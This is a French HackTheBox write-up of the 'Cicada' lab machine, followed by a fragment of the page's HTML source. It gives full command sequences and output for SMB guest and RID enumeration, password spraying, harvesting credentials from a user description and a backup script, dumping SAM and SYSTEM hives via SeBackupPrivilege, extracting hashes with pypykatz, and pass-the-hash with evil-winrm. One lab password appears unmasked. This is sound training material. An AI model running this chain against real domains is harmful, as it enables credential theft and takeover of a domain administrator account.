2c93:6d7b:cfd8:11b9:9f71:1a5a:155d:88d3:4a52:157a Explication de la commande: nxc smb 10.10.11.35 -u guest -p '' --rid-brute --shares Cette commande est utilisée pour interagir avec un serveur SMB à l’adresse IP 10.10.11.35 en utilisant un utilisateur guest sans mot de passe, tout en tentant de bruteforcer les RID (identifiants relatifs) et en énumérant les partages SMB disponibles.\n1. nxc nxc est un outil de ligne de commande permettant d’interagir avec des hôtes SMB. Il est utilisé pour effectuer des tests de pénétration, des explorations ou des attaques sur des serveurs SMB. Cela permet de scanner, bruteforcer des mots de passe et exécuter diverses actions sur des partages SMB. 2. smb Cette option indique que la commande va utiliser le protocole SMB (Server Message Block) pour interagir avec l’hôte distant. SMB est utilisé pour le partage de fichiers et d’imprimantes sur un réseau local. 3. 10.10.11.35 Il s’agit de l’adresse IP de la machine cible à laquelle vous vous connectez via SMB. Cette adresse cible est 10.10.11.35. 4. -u guest L’option -u spécifie l’utilisateur avec lequel vous tentez de vous connecter au serveur SMB. Dans ce cas, l’utilisateur est guest, un compte souvent utilisé pour l’accès limité ou public aux ressources partagées. 5. -p ‘’ L’option -p définit le mot de passe associé à l’utilisateur spécifié. Ici, le mot de passe est vide (''), ce qui signifie que la commande tente de se connecter avec l’utilisateur guest sans mot de passe. 6. –rid-brute L’option --rid-brute active le bruteforce des RID (Relative Identifier). Un RID est un identifiant unique attribué à chaque utilisateur ou groupe dans un domaine Windows. Cette option permet de tester plusieurs RID pour énumérer les utilisateurs sur le serveur SMB cible. 7. –shares L’option --shares permet d’énumérer les partages SMB disponibles sur le serveur cible. Un partage SMB est une ressource partagée (dossier, imprimante, etc.) accessible à partir du réseau. Cette option liste tous les partages disponibles sur la machine cible. Ce que fait cette commande : Connexion au serveur SMB : La commande tente de se connecter au serveur SMB à l’adresse IP 10.10.11.35 avec l’utilisateur guest sans mot de passe. Bruteforce des RID : Elle effectue un bruteforce sur les RID pour énumérer les utilisateurs présents sur le serveur cible. Énumération des partages : Elle liste les partages SMB disponibles sur le serveur cible. Affichage des résultats : Si la commande réussit, elle affiche les partages et les utilisateurs trouvés sur la machine cible. Exemple de sortie attendue : smb: \\\u003e ls . D 0 Thu Mar 14 13:29:09 2024 .. D 0 Thu Mar 14 13:21:29 2024 Notice from HR.txt A 1266 Wed Aug 28 19:31:48 2024 Dans cet exemple, la commande a trouvé un fichier Notice from HR.txt dans le répertoire HR sur le serveur SMB.\nOn y voit un mot de passe sans nom d’utilisateur\nmsf6 auxiliary(scanner/smb/smb_login) \u003e exploit [*] 10.10.11.35:445 - 10.10.11.35:445 - Starting SMB login bruteforce [-] 10.10.11.35:445 - 10.10.11.35:445 - Failed: '.\\Administrator:Cicada$M6xxxxxxxxxxxxxx', [!] 10.10.11.35:445 - No active DB -- Credential data will not be saved! [-] 10.10.11.35:445 - 10.10.11.35:445 - Failed: '.\\Guest:Cicada$M6xxxxxxxxxxxxxx, [-] 10.10.11.35:445 - 10.10.11.35:445 - Failed: '.\\krbtgt:Cicada$M6xxxxxxxxxxxxxx', [-] 10.10.11.35:445 - 10.10.11.35:445 - Failed: '.\\CICADA-DC$ :Cicada$M6xxxxxxxxxxxxxx', [-] 10.10.11.35:445 - 10.10.11.35:445 - Failed: '.\\john.smoulder:Cicada$M6xxxxxxxxxxxxxx', [-] 10.10.11.35:445 - 10.10.11.35:445 - Failed: '.\\sarah.dantelia:Cicada$M6xxxxxxxxxxxxxx', [+] 10.10.11.35:445 - 10.10.11.35:445 - Success: '.\\michael.wrightson:Cicada$M6xxxxxxxxxxxxxx' [*] SMB session 1 opened (10.10.14.204:44061 -\u003e 10.10.11.35:445) at 2025-01-25 22:17:40 +0100 [-] 10.10.11.35:445 - 10.10.11.35:445 - Failed: '.\\david.orelious:Cicada$M6xxxxxxxxxxxxxx, [-] 10.10.11.35:445 - 10.10.11.35:445 - Failed: '.\\emily.oscars:Cicada$M6xxxxxxxxxxxxxx', [*] 10.10.11.35:445 - Scanned 1 of 1 hosts (100% complete) [*] 10.10.11.35:445 - Bruteforce completed, 1 credential was successful. [*] 10.10.11.35:445 - 1 SMB session was opened successfully. [*] Auxiliary module execution completed netexec smb 10.10.11.35 -u michael.wrightson -p 'Cicada$M6xxxxxxxxxxxxxx' --users --rid-brute SMB 10.10.11.35 445 CICADA-DC [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False) SMB 10.10.11.35 445 CICADA-DC [+] cicada.htb\\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 SMB 10.10.11.35 445 CICADA-DC -Username- -Last PW Set- -BadPW- -Description- SMB 10.10.11.35 445 CICADA-DC Administrator 2024-08-26 20:08:03 12 Built-in account for administering the computer/domain SMB 10.10.11.35 445 CICADA-DC Guest 2024-08-28 17:26:56 0 Built-in account for guest access to the computer/domain SMB 10.10.11.35 445 CICADA-DC krbtgt 2024-03-14 11:14:10 2 Key Distribution Center Service Account SMB 10.10.11.35 445 CICADA-DC john.smoulder 2024-03-14 12:17:29 12 SMB 10.10.11.35 445 CICADA-DC sarah.dantelia 2024-03-14 12:17:29 12 SMB 10.10.11.35 445 CICADA-DC michael.wrightson 2024-03-14 12:17:29 0 SMB 10.10.11.35 445 CICADA-DC david.orelious 2024-03-14 12:17:29 12 Just in case I forget my password is aRtxxxxxxxxx SMB 10.10.11.35 445 CICADA-DC emily.oscars 2024-08-22 21:20:17 12 SMB 10.10.11.35 445 CICADA-DC [*] Enumerated 8 local users: CICADA SMB 10.10.11.35 445 CICADA-DC 498: CICADA\\Enterprise Read-only Domain Controllers (SidTypeGroup) SMB 10.10.11.35 445 CICADA-DC 500: CICADA\\Administrator (SidTypeUser) SMB 10.10.11.35 445 CICADA-DC 501: CICADA\\Guest (SidTypeUser) SMB 10.10.11.35 445 CICADA-DC 502: CICADA\\krbtgt (SidTypeUser) SMB 10.10.11.35 445 CICADA-DC 512: CICADA\\Domain Admins (SidTypeGroup) SMB 10.10.11.35 445 CICADA-DC 513: CICADA\\Domain Users (SidTypeGroup) SMB 10.10.11.35 445 CICADA-DC 514: CICADA\\Domain Guests (SidTypeGroup) SMB 10.10.11.35 445 CICADA-DC 515: CICADA\\Domain Computers (SidTypeGroup) SMB 10.10.11.35 445 CICADA-DC 516: CICADA\\Domain Controllers (SidTypeGroup) SMB 10.10.11.35 445 CICADA-DC 517: CICADA\\Cert Publishers (SidTypeAlias) SMB 10.10.11.35 445 CICADA-DC 518: CICADA\\Schema Admins (SidTypeGroup) SMB 10.10.11.35 445 CICADA-DC 519: CICADA\\Enterprise Admins (SidTypeGroup) SMB 10.10.11.35 445 CICADA-DC 520: CICADA\\Group Policy Creator Owners (SidTypeGroup) SMB 10.10.11.35 445 CICADA-DC 521: CICADA\\Read-only Domain Controllers (SidTypeGroup) SMB 10.10.11.35 445 CICADA-DC 522: CICADA\\Cloneable Domain Controllers (SidTypeGroup) SMB 10.10.11.35 445 CICADA-DC 525: CICADA\\Protected Users (SidTypeGroup) SMB 10.10.11.35 445 CICADA-DC 526: CICADA\\Key Admins (SidTypeGroup) SMB 10.10.11.35 445 CICADA-DC 527: CICADA\\Enterprise Key Admins (SidTypeGroup) SMB 10.10.11.35 445 CICADA-DC 553: CICADA\\RAS and IAS Servers (SidTypeAlias) SMB 10.10.11.35 445 CICADA-DC 571: CICADA\\Allowed RODC Password Replication Group (SidTypeAlias) SMB 10.10.11.35 445 CICADA-DC 572: CICADA\\Denied RODC Password Replication Group (SidTypeAlias) SMB 10.10.11.35 445 CICADA-DC 1000: CICADA\\CICADA-DC$ (SidTypeUser) SMB 10.10.11.35 445 CICADA-DC 1101: CICADA\\DnsAdmins (SidTypeAlias) SMB 10.10.11.35 445 CICADA-DC 1102: CICADA\\DnsUpdateProxy (SidTypeGroup) SMB 10.10.11.35 445 CICADA-DC 1103: CICADA\\Groups (SidTypeGroup) SMB 10.10.11.35 445 CICADA-DC 1104: CICADA\\john.smoulder (SidTypeUser) SMB 10.10.11.35 445 CICADA-DC 1105: CICADA\\sarah.dantelia (SidTypeUser) SMB 10.10.11.35 445 CICADA-DC 1106: CICADA\\michael.wrightson (SidTypeUser) SMB 10.10.11.35 445 CICADA-DC 1108: CICADA\\david.orelious (SidTypeUser) SMB 10.10.11.35 445 CICADA-DC 1109: CICADA\\Dev Support (SidTypeGroup) SMB 10.10.11.35 445 CICADA-DC 1601: CICADA\\emily.oscars (SidTypeUser) ┌──(keylloger㉿Kali)-[~/…/VM/HTB/EASY/Cicada] └─$ smbclient //10.10.11.35/DEV -U david.orelious Password for [WORKGROUP\\david.orelious]: Try \"help\" to get a list of possible commands. smb: \\\u003e ls . D 0 Thu Mar 14 13:31:39 2024 .. D 0 Thu Mar 14 13:21:29 2024 Backup_script.ps1 A 601 Wed Aug 28 19:28:22 2024 4168447 blocks of size 4096. 377922 blocks available smb: \\\u003e mget Backup_script.ps1 Get file Backup_script.ps1? y getting file \\Backup_script.ps1 of size 601 as Backup_script.ps1 (5,5 KiloBytes/sec) (average 5,5 KiloBytes/sec) smb: \\\u003e ^C ┌──(keylloger㉿Kali)-[~/…/VM/HTB/EASY/Cicada] └─$ cat Backup_script.ps1 $sourceDirectory = \"C:\\smb\" $destinationDirectory = \"D:\\Backup\" $username = \"emily.oscars\" $password = ConvertTo-SecureString \"Q!3@Lpxxxxxxxxxx\" -AsPlainText -Force $credentials = New-Object System.Management.Automation.PSCredential($username, $password) $dateStamp = Get-Date -Format \"yyyyMMdd_HHmmss\" $backupFileName = \"smb_backup_$dateStamp.zip\" $backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath Write-Host \"Backup completed successfully. Backup file saved to: $backupFilePath\" Pour la privesc je vous redirige vers ceci : https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/?source=post_page-----0ebda6a51519--------------------------------\nEvil-WinRM* PS C:\\Users\\emily.oscars.CICADA\u003e mkdir Temp Directory: C:\\Users\\emily.oscars.CICADA Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 1/26/2025 12:06 AM Temp *Evil-WinRM* PS C:\\Users\\emily.oscars.CICADA\u003e cd Temp *Evil-WinRM* PS C:\\Users\\emily.oscars.CICADA\\Temp\u003e reg save hklm\\sam C:\\Users\\emily.oscars.CICADA\\Temp\\sam The operation completed successfully. *Evil-WinRM* PS C:\\Users\\emily.oscars.CICADA\\Temp\u003e reg save hklm\\system C:\\Users\\emily.oscars.CICADA\\Temp\\system The operation completed successfully. *Evil-WinRM* PS C:\\Users\\emily.oscars.CICADA\\Temp\u003e download sam Info: Downloading C:\\Users\\emily.oscars.CICADA\\Temp\\sam to sam Info: Download successful! *Evil-WinRM* PS C:\\Users\\emily.oscars.CICADA\\Temp\u003e download system Info: Downloading C:\\Users\\emily.oscars.CICADA\\Temp\\system to system Info: Download successful! pypykatz registry --sam sam system WARNING:pypykatz:SECURITY hive path not supplied! Parsing SECURITY will not work WARNING:pypykatz:SOFTWARE hive path not supplied! Parsing SOFTWARE will not work ============== SYSTEM hive secrets ============== CurrentControlSet: ControlSet001 Boot Key: 3c2b033757a49110a9ee680b46e8d620 ============== SAM hive secrets ============== HBoot Key: a1c299e572ff8c643a857d3fdb3e5c7c10101010101010101010101010101010 Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87xxxxxxxxxxxxxxxxxxxxxx::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: ┌──(keylloger㉿Kali)-[~/…/VM/HTB/EASY/Cicada] └─$ evil-winrm -i 10.10.11.35 -u Administrator -H '2b87e7c93axxxxxxxxxxxxxxxxxxxxxxx' Evil-WinRM shell v3.7 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\Administrator\\Documents\u003e cd .. *Evil-WinRM* PS C:\\Users\\Administrator\u003e cd Desktop *Evil-WinRM* PS C:\\Users\\Administrator\\Desktop\u003e cat root.txt a193211xxxxxxxxxxxxxxxxxxxxxxxxxx *Evil-WinRM* PS C:\\Users\\Administrator\\Desktop\u003e ",
+  "wordCount" : "2652",
+  "inLanguage": "en",
+  "datePublished": "2026-03-27T00:00:00Z",
+  "dateModified": "2026-03-27T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "keyll0ger"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://keyll0ger.github.io/posts/cicada/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "keyll0ger",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://keyll0ger.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class=" dark" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://keyll0ger.github.io/" accesskey="h" title="keyll0ger (Alt + H)">keyll0ger</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://keyll0ger.github.io/posts/" title="Writeups">
+                    <span>Writeups</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://keyll0ger.github.io/tags/" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://keyll0ger.github.io/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://keyll0ger.github.io/about/" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://keyll0ger.github.io/">Home</a>&nbsp;»&nbsp;<a href="https://keyll0ger.github.io/posts/">Posts</a></div>
+    <h1 class="post-title entry-hint-parent">
+      Cicada - HackTheBox Writeup
+    </h1>
+    <div class="post-meta"><span title='2026-03-27 00:00:00 +0000 UTC'>March 27, 2026</span>&nbsp;·&nbsp;13 min&nbsp;·&nbsp;keyll0ger
+
+</div>
+  </header> <div class="toc">
+    <details  open>
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul><ul>
+                <li>
+                    <a href="#nmap-full-scan" aria-label="Nmap Full Scan">Nmap Full Scan</a></li></ul>
+                    
+                <li>
+                    <a href="#nmap-scan-report-for-10101135" aria-label="Nmap Scan Report for 10.10.11.35">Nmap Scan Report for 10.10.11.35</a><ul>
+                        
+                <li>
+                    <a href="#open-ports" aria-label="Open Ports">Open Ports</a></li>
+                <li>
+                    <a href="#ssl-certificates" aria-label="SSL Certificates">SSL Certificates</a><ul>
+                        
+                <li>
+                    <a href="#common-name-cicada-dccicadahtb" aria-label="Common Name: CICADA-DC.cicada.htb">Common Name: CICADA-DC.cicada.htb</a></li></ul>
+                </li>
+                <li>
+                    <a href="#explication-de-la-commande" aria-label="Explication de la commande:">Explication de la commande:</a><ul>
+                        
+                <li>
+                    <a href="#1-nxc" aria-label="1. nxc">1. nxc</a></li>
+                <li>
+                    <a href="#2-smb" aria-label="2. smb">2. smb</a></li>
+                <li>
+                    <a href="#3-10101135" aria-label="3. 10.10.11.35">3. 10.10.11.35</a></li>
+                <li>
+                    <a href="#4--u-guest" aria-label="4. -u guest">4. -u guest</a></li>
+                <li>
+                    <a href="#5--p-" aria-label="5. -p &lsquo;&rsquo;">5. -p &lsquo;&rsquo;</a></li>
+                <li>
+                    <a href="#6---rid-brute" aria-label="6. &ndash;rid-brute">6. &ndash;rid-brute</a></li>
+                <li>
+                    <a href="#7---shares" aria-label="7. &ndash;shares">7. &ndash;shares</a></li></ul>
+                </li>
+                <li>
+                    <a href="#ce-que-fait-cette-commande-" aria-label="Ce que fait cette commande :">Ce que fait cette commande :</a></li>
+                <li>
+                    <a href="#exemple-de-sortie-attendue-" aria-label="Exemple de sortie attendue :">Exemple de sortie attendue :</a>
+                </li>
+            </ul>
+            </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><p><img loading="lazy" src="https://github.com/user-attachments/assets/1cf736dd-fac1-40c0-aba2-5c103d0076ca" alt="image"  />
+</p>
+<h2 id="nmap-full-scan">Nmap Full Scan<a hidden class="anchor" aria-hidden="true" href="#nmap-full-scan">#</a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>keylloger㉿Kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/…/VM/HTB/EASY/Cicada<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nmap -sV -sC -p- -vv 10.10.11.35 -oN cicada.txt 
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2025-01-25 21:22 CET
+</span></span><span style="display:flex;"><span>NSE: Loaded <span style="color:#ae81ff">156</span> scripts <span style="color:#66d9ef">for</span> scanning.
+</span></span><span style="display:flex;"><span>NSE: Script Pre-scanning.
+</span></span><span style="display:flex;"><span>NSE: Starting runlevel <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>of 3<span style="color:#f92672">)</span> scan.
+</span></span><span style="display:flex;"><span>Initiating NSE at 21:22
+</span></span><span style="display:flex;"><span>Completed NSE at 21:22, 0.00s elapsed
+</span></span><span style="display:flex;"><span>NSE: Starting runlevel <span style="color:#ae81ff">2</span> <span style="color:#f92672">(</span>of 3<span style="color:#f92672">)</span> scan.
+</span></span><span style="display:flex;"><span>Initiating NSE at 21:22
+</span></span><span style="display:flex;"><span>Completed NSE at 21:22, 0.00s elapsed
+</span></span><span style="display:flex;"><span>NSE: Starting runlevel <span style="color:#ae81ff">3</span> <span style="color:#f92672">(</span>of 3<span style="color:#f92672">)</span> scan.
+</span></span><span style="display:flex;"><span>Initiating NSE at 21:22
+</span></span><span style="display:flex;"><span>Completed NSE at 21:22, 0.00s elapsed
+</span></span><span style="display:flex;"><span>Initiating Ping Scan at 21:22
+</span></span><span style="display:flex;"><span>Scanning 10.10.11.35 <span style="color:#f92672">[</span><span style="color:#ae81ff">4</span> ports<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Completed Ping Scan at 21:22, 0.06s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> total hosts<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Initiating Parallel DNS resolution of <span style="color:#ae81ff">1</span> host. at 21:22
+</span></span><span style="display:flex;"><span>Completed Parallel DNS resolution of <span style="color:#ae81ff">1</span> host. at 21:22, 0.00s elapsed
+</span></span><span style="display:flex;"><span>Initiating SYN Stealth Scan at 21:22
+</span></span><span style="display:flex;"><span>Scanning 10.10.11.35 <span style="color:#f92672">[</span><span style="color:#ae81ff">65535</span> ports<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Discovered open port 53/tcp on 10.10.11.35
+</span></span><span style="display:flex;"><span>Discovered open port 135/tcp on 10.10.11.35
+</span></span><span style="display:flex;"><span>Discovered open port 445/tcp on 10.10.11.35
+</span></span><span style="display:flex;"><span>Discovered open port 139/tcp on 10.10.11.35
+</span></span><span style="display:flex;"><span>Discovered open port 3269/tcp on 10.10.11.35
+</span></span><span style="display:flex;"><span>SYN Stealth Scan Timing: About 14.88% <span style="color:#66d9ef">done</span>; ETC: 21:26 <span style="color:#f92672">(</span>0:02:57 remaining<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SYN Stealth Scan Timing: About 33.72% <span style="color:#66d9ef">done</span>; ETC: 21:25 <span style="color:#f92672">(</span>0:02:00 remaining<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Discovered open port 593/tcp on 10.10.11.35
+</span></span><span style="display:flex;"><span>Discovered open port 88/tcp on 10.10.11.35
+</span></span><span style="display:flex;"><span>Discovered open port 62424/tcp on 10.10.11.35
+</span></span><span style="display:flex;"><span>Discovered open port 5985/tcp on 10.10.11.35
+</span></span><span style="display:flex;"><span>Discovered open port 389/tcp on 10.10.11.35
+</span></span><span style="display:flex;"><span>SYN Stealth Scan Timing: About 48.20% <span style="color:#66d9ef">done</span>; ETC: 21:25 <span style="color:#f92672">(</span>0:01:44 remaining<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Discovered open port 464/tcp on 10.10.11.35
+</span></span><span style="display:flex;"><span>SYN Stealth Scan Timing: About 64.99% <span style="color:#66d9ef">done</span>; ETC: 21:25 <span style="color:#f92672">(</span>0:01:08 remaining<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Discovered open port 3268/tcp on 10.10.11.35
+</span></span><span style="display:flex;"><span>SYN Stealth Scan Timing: About 80.07% <span style="color:#66d9ef">done</span>; ETC: 21:25 <span style="color:#f92672">(</span>0:00:39 remaining<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Discovered open port 636/tcp on 10.10.11.35
+</span></span><span style="display:flex;"><span>Completed SYN Stealth Scan at 21:25, 197.41s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">65535</span> total ports<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Initiating Service scan at 21:25
+</span></span><span style="display:flex;"><span>Scanning <span style="color:#ae81ff">13</span> services on 10.10.11.35
+</span></span><span style="display:flex;"><span>Completed Service scan at 21:26, 54.01s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">13</span> services on <span style="color:#ae81ff">1</span> host<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>NSE: Script scanning 10.10.11.35.
+</span></span><span style="display:flex;"><span>NSE: Starting runlevel <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>of 3<span style="color:#f92672">)</span> scan.
+</span></span><span style="display:flex;"><span>Initiating NSE at 21:26
+</span></span><span style="display:flex;"><span>Stats: 0:04:25 elapsed; <span style="color:#ae81ff">0</span> hosts completed <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> up<span style="color:#f92672">)</span>, <span style="color:#ae81ff">1</span> undergoing Script Scan
+</span></span><span style="display:flex;"><span>NSE: Active NSE Script Threads: <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> waiting<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>NSE Timing: About 99.94% <span style="color:#66d9ef">done</span>; ETC: 21:26 <span style="color:#f92672">(</span>0:00:00 remaining<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Completed NSE at 21:27, 40.06s elapsed
+</span></span><span style="display:flex;"><span>NSE: Starting runlevel <span style="color:#ae81ff">2</span> <span style="color:#f92672">(</span>of 3<span style="color:#f92672">)</span> scan.
+</span></span><span style="display:flex;"><span>Initiating NSE at 21:27
+</span></span><span style="display:flex;"><span>Completed NSE at 21:27, 1.57s elapsed
+</span></span><span style="display:flex;"><span>NSE: Starting runlevel <span style="color:#ae81ff">3</span> <span style="color:#f92672">(</span>of 3<span style="color:#f92672">)</span> scan.
+</span></span><span style="display:flex;"><span>Initiating NSE at 21:27
+</span></span><span style="display:flex;"><span>Completed NSE at 21:27, 0.00s elapsed
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.35
+</span></span><span style="display:flex;"><span>Host is up, received echo-reply ttl <span style="color:#ae81ff">127</span> <span style="color:#f92672">(</span>0.027s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Scanned at 2025-01-25 21:22:32 CET <span style="color:#66d9ef">for</span> 293s
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65522</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE       REASON          VERSION
+</span></span><span style="display:flex;"><span>53/tcp    open  domain        syn-ack ttl <span style="color:#ae81ff">127</span> Simple DNS Plus
+</span></span><span style="display:flex;"><span>88/tcp    open  kerberos-sec  syn-ack ttl <span style="color:#ae81ff">127</span> Microsoft Windows Kerberos <span style="color:#f92672">(</span>server time: 2025-01-26 03:25:56Z<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>135/tcp   open  msrpc         syn-ack ttl <span style="color:#ae81ff">127</span> Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn   syn-ack ttl <span style="color:#ae81ff">127</span> Microsoft Windows netbios-ssn
+</span></span><span style="display:flex;"><span>389/tcp   open  ldap          syn-ack ttl <span style="color:#ae81ff">127</span> Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: cicada.htb0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>CICADA-DC.cicada.htb
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:CICADA-DC.cicada.htb
+</span></span><span style="display:flex;"><span>| Issuer: commonName<span style="color:#f92672">=</span>CICADA-DC-CA/domainComponent<span style="color:#f92672">=</span>cicada
+</span></span><span style="display:flex;"><span>| Public Key type: rsa
+</span></span><span style="display:flex;"><span>| Public Key bits: <span style="color:#ae81ff">2048</span>
+</span></span><span style="display:flex;"><span>| Signature Algorithm: sha256WithRSAEncryption
+</span></span><span style="display:flex;"><span>| Not valid before: 2024-08-22T20:24:16
+</span></span><span style="display:flex;"><span>| Not valid after:  2025-08-22T20:24:16
+</span></span><span style="display:flex;"><span>| MD5:   9ec5:1a23:40ef:b5b8:3d2c:39d8:447d:db65
+</span></span><span style="display:flex;"><span>| SHA-1: 2c93:6d7b:cfd8:11b9:9f71:1a5a:155d:88d3:4a52:157a
+</span></span><span style="display:flex;"><span>| -----BEGIN CERTIFICATE-----
+</span></span><span style="display:flex;"><span>| MIIF4DCCBMigAwIBAgITHgAAAAOY38QFU4GSRAABAAAAAzANBgkqhkiG9w0BAQsF
+</span></span><span style="display:flex;"><span>| ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGY2ljYWRh
+</span></span><span style="display:flex;"><span>| MRUwEwYDVQQDEwxDSUNBREEtREMtQ0EwHhcNMjQwODIyMjAyNDE2WhcNMjUwODIy
+</span></span><span style="display:flex;"><span>| MjAyNDE2WjAfMR0wGwYDVQQDExRDSUNBREEtREMuY2ljYWRhLmh0YjCCASIwDQYJ
+</span></span><span style="display:flex;"><span>| KoZIhvcNAQEBBQADggEPADCCAQoCggEBAOatZznJ1Zy5E8fVFsDWtq531KAmTyX8
+</span></span><span style="display:flex;"><span>| BxPdIVefG1jKHLYTvSsQLVDuv02+p29iH9vnqYvIzSiFWilKCFBxtfOpyvCaEQua
+</span></span><span style="display:flex;"><span>| NaJqv3quymk/pw0xMfSLMuN5emPJ5yHtC7cantY51mSDrvXBxMVIf23JUKgbhqSc
+</span></span><span style="display:flex;"><span>| Srdh8fhL8XKgZXVjHmQZVn4ONg2vJP2tu7P1KkXXj7Mdry9GFEIpLdDa749PLy7x
+</span></span><span style="display:flex;"><span>| o1yw8CloMMtcFKwVaJHy7tMgwU5PVbFBeUhhKhQ8jBR3OBaMBtqIzIAJ092LNysy
+</span></span><span style="display:flex;"><span>| 4W6q8iWFc+Tb43gFP4nfb1Xvp5mJ2pStqCeZlneiL7Be0SqdDhljB4ECAwEAAaOC
+</span></span><span style="display:flex;"><span>| Au4wggLqMC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8A
+</span></span><span style="display:flex;"><span>| bABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/
+</span></span><span style="display:flex;"><span>| BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3
